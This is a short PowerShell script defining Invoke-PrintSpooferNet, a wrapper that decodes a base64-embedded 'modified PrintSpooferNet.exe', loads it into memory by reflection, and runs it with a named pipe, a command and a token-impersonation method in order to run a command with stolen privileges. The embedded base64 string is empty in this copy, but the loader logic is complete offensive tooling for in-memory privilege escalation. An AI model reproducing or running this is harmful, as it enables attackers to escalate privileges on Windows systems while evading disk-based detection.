function Invoke-PrintSpooferNet
{
    Param([string]$Pipe,[string]$Command, [string]$Method)
    if(-not($Pipe) -Or -not($Command) -Or -not($Method)) 
    { 
        Write-Host "Invalid number of args. Syntax: Invoke-PrintSpooferNet -Pipe '\\\\.\\pipe\\test\\pipe\\spoolss' -Command 'calc.exe' -Method <CreateProcessAsUserW, CreateProcessWithTokenW>"
	      Break Script
    }
    # Base64 modified PrintSpooferNet.exe 
    $PrintSpooferNetB64 = ""
    $Stream=New-Object IO.MemoryStream(,[Convert]::FromBAsE64String($PrintSpooferNetB64))
    $output = New-Object System.IO.MemoryStream
    $Stream.CopyTo( $output )
    [byte[]] $byteOutArray = $output.ToArray()
    $RAS = [System.Reflection.Assembly]::Load($byteOutArray)
    $OldConsoleOut = [Console]::Out
    $StringWriter = New-Object IO.StringWriter
    [Console]::SetOut($StringWriter)
    $ExecInput = @($Pipe, $Command, $Method).split("")

    # Execute Binary 
    [PrintSpooferNet.PrintSpooferNet]::main($ExecInput)

    # Print Result 
    [Console]::SetOut($OldConsoleOut)
    $Results = $StringWriter.ToString()
    $Results
}
